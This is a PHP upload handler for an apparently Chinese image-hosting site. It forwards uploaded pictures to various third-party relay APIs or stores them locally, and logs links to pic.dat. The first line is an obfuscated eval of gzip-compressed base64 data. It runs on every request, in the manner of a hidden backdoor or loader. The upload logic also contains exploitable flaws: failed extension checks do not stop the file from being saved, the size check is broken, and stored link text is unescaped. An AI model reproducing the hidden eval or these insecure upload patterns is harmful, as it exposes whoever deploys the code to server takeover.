<?php eval(gzinflate(base64_decode("\x62\x59\x35\116\141\64\x4e\101\106\105\x58\63\147\x76\x39\150\105\107\x47\125\147\x49\107\x53\116\x36\105\x6b\x5a\x74\x56\x53\147\164\x4e\62\156\132\x52\123\x78\166\x47\x70\x6a\66\x67\172\146\x68\121\161\x4a\x66\x2b\x39\x57\x74\x74\144\126\156\144\170\x7a\162\x33\x76\115\144\145\x68\122\x6c\145\146\x47\124\113\165\x54\126\x32\142\x5a\161\62\x4e\x48\x54\163\x71\x79\151\x47\x79\160\145\127\x37\127\60\x4b\124\x55\x2f\106\x50\x66\x66\x6f\151\x5a\x65\112\x55\x39\x53\x67\x32\110\170\154\x71\153\x32\110\x67\114\x38\x34\x62\124\61\x76\x2b\x48\x73\64\142\x4f\x51\x76\70\126\104\x56\x78\166\x50\x67\x68\x2b\x33\x61\x64\113\61\x59\71\x54\165\x6e\142\107\x78\x4d\x63\116\x76\x55\122\67\116\60\x44\x70\x44\x69\113\112\x4f\x6e\x67\x52\111\125\x34\61\x35\x66\x74\144\x6e\x77\x57\x78\71\x64\x37\x6b\x50\x54\171\155\171\x65\x61\x32\112\x4d\123\143\x6e\x55\107\117\130\145\x77\x45\x4d\154\161\101\107\147\146\121\142\x5a\x79\70\156\115\x2b\57\64\103\66\x4e\115\x7a\142\71\67\157\152\117\x78\x78\x55\150\x64\x30\121\143\103\71\x61\x72\x6b\143\145\104\x2f\x66\x72\x50\53\142\x74\x72\161\x37\172\101\x77\75\x3d")));?>
<?php
//三楼接口
include "./common/function.php";
$file = $_FILES['file'];
if($config['web']==0){echo "<script>alert('网站正在维护哦～');window.location.href='404.html';</script>";}
if($file['error']!=0) {
    echo "<script>alert('还没有上传图片哦～');window.history.go(-1)</script>";
}
if($_GET["type"]=="hlx"){
if($config['hlx']==0){echo "<script>alert('三楼接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://tool.lq520.club:66/api/hlximg.php',$new_filename);
		$json=json_decode($data,true);
		@unlink($new_filename);
		if($json["code"]==1){
			$msg=$json["msg"];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：三楼接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}
}
else
if($_GET["type"]=="qq"){
if($config['qq']==0){echo "<script>alert('qq接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://tool.lq520.club:66/api/qqimg.php',$new_filename);
		$json=json_decode($data,true);
		@unlink($new_filename);
		if($json["code"]==1){
			$msg=$json["msg"];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：qq接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}
}else
if($_GET["type"]=="tt"){
if($config['tt']==0){echo "<script>alert('头条接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://tool.lq520.club:66/api/ttimg.php',$new_filename);
		$json=json_decode($data,true);
		@unlink($new_filename);
		if($json["code"]==1){
			$msg=$json["msg"];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：头条接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}
}else
if($_GET["type"]=="bd"){
if($config['bd']==0){echo "<script>alert('百度接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://tool.lq520.club:66/api/bdimg.php',$new_filename);
     $json=json_decode($data,true);
		@unlink($new_filename);
		if($json["code"]==1){
			$msg=$json["msg"];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：百度接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}
}else
if($_GET["type"]=="58"){
if($config['58']==0){echo "<script>alert('58接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://tool.lq520.club:66/api/58img.php',$new_filename);
		$json=json_decode($data,true);
		@unlink($new_filename);
		if($json["code"]==1){
			$msg=$json["msg"];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：58接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}
}else
if($_GET["type"]=="sh"){
if($config['sh']==0){echo "<script>alert('本地接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://tool.lq520.club:66/api/shimg.php',$new_filename);
		$json=json_decode($data,true);
		@unlink($new_filename);
		if($json["code"]==1){
			$msg=$json["msg"];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：搜狐接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}
}else
if($_GET["type"]=="jd"){
if($config['jd']==0){echo "<script>alert('京东接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://tool.lq520.club:66/api/jdimg.php',$new_filename);
		$json=json_decode($data,true);
		@unlink($new_filename);
		if($json["code"]==1){
			$msg=$json["msg"];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：京东接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}
}else
if($_GET["type"]=="jz"){
if($config['jz']==0){echo "<script>alert('芥子接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://tool.lq520.club:66/api/jzimg.php',$new_filename);
		$json=json_decode($data,true);
		@unlink($new_filename);
		if($json["code"]==1){
			$msg=$json["msg"];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：芥子接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}
}else
if($_GET["type"]=="bz"){
if($config['bilibili']==0){echo "<script>alert('b站接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		echo "<script>alert('上传格式错误呢～');window.history.go(-1)</script>";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://tool.lq520.club:66/api/bzimg.php',$new_filename);
		$pattern = '/"msg":"(.*?)"/';
		preg_match($pattern, $data, $match);
		@unlink($new_filename);
		if($match && $match[1]!=''){
		$msg=$match[1];
		$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：b站接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{			
			echo "<script>alert('嘤嘤嘤，上传失败了～');window.history.go(-1)</script>";
		}
	}else{
		echo "<script>alert('上传数据好像有误哦～');window.history.go(-1)</script>";
	}
}else{
		echo "<script>alert('上传失败了耶～');window.history.go(-1)</script>";
}
}else
if($_GET["type"]=="api"){
if($config['xiaogf']==0){echo "<script>alert('小猫咪接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		echo "<script>alert('上传格式错误呢～');window.history.go(-1)</script>";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://pic.lq520.club:81/api.php',$new_filename);
		$pattern = '/"msg":"(.*?)"/';
		preg_match($pattern, $data, $match);
		@unlink($new_filename);
		if($match && $match[1]!=''){
		$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：小猫咪接口（'.$time.'）</a><br><br>');//记录图片链接
			$msg=$match[1];
		}else{			
			echo "<script>alert('嘤嘤嘤，上传失败了～');window.history.go(-1)</script>";
		}
	}else{
		echo "<script>alert('上传数据好像有误哦～');window.history.go(-1)</script>";
	}

}else{
		echo "<script>alert('上传失败了耶～');window.history.go(-1)</script>";
}
}else
if($_GET["type"]=="bj"){
if($config['bj']==0){echo "<script>alert('笔迹接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://xia.loli.wang/usr/upload.php',$new_filename);
		$json=json_decode($data,true);
		@unlink($new_filename);
		if($json["code"]==1){
			$msg=$json["msg"];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：笔迹接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}
}else
if($_GET["type"]=="sougou"){
if($config['sougou']==0){echo "<script>alert('搜狗接口已关闭');window.location.href='index.php';</script>";}
if (is_uploaded_file($file['tmp_name'])){
	$arr = pathinfo($file['name']);
	$ext_suffix = $arr['extension'];
	$allow_suffix = array('jpg','gif','jpeg','png');
	if(!in_array($ext_suffix, $allow_suffix)){
		$msg="上传格式错误呢";
	}
	$new_filename = time().rand(100,1000).'.'.$ext_suffix;
	if (move_uploaded_file($file['tmp_name'], $new_filename)){
     $data = upload('http://tool.lq520.club:66/api/sougou.php',$new_filename);
		$json=json_decode($data,true);
		@unlink($new_filename);
		if($json["code"]==1){
			$msg=$json["msg"];
			$time=date('Y-m-d');
			$pic = fopen("pic.dat",  "a+");
			fwrite( $pic, '<a href="'.$msg.'">来源：搜狗接口（'.$time.'）</a><br><br>');//记录图片链接
		}else{
			$msg="嘤嘤嘤，上传失败了～";
		}
	}else{
		$msg="上传数据好像有误～";
	}

}else{
		$msg="上传数据好像有误～";
}
}else
if($_GET["type"]=="localhost"){
if($config['local']==0){echo "<script>alert('本地接口已关闭');window.location.href='index.php';</script>";}
$ext = pathinfo($file['name'],PATHINFO_EXTENSION);
$allow_ext = array(0=>'png',1=>'jpeg',2=>'png',3=>'jpg',4=>'JPEG',5=>'gif');
if(!in_array($ext,$allow_ext)) {
    echo "<script>alert('系统不支持这种格式的图片哦～');window.history.go(-1)</script>";
}else{
$allow_size = 10;
if(!$file['size']>$allpw_size) {
    echo "<script>alert('图片太大啦～换一张吧');window.history.go(-1)</script>";
}else{
$dir = 'upload';
$sub_dir = date('Y-m-d');
$path = $dir.'/'.$sub_dir;
if(!is_dir($dir)) {
    mkdir($dir);
    mkdir($path);
}elseif(!is_dir($path)) {
    mkdir($path);
}
$file_name= date('ymdhis').rand(1000,9999).'.'.$ext;
move_uploaded_file($file['tmp_name'],$path.'/'.$file_name);
$msg='http://'.$_SERVER['HTTP_HOST'].'/'.$path.'/'.$file_name.'';
$time=date('Y-m-d');
$file = fopen("pic.dat",  "a+");
fwrite( $file, '<a href="http://'.$_SERVER['HTTP_HOST'].'/'.$path.'/'.$file_name.'">来源：本地接口（'.$time.'）</a><br><br>');//记录图片链接
}
}
}
?>
<?
include "./sc.html";
?>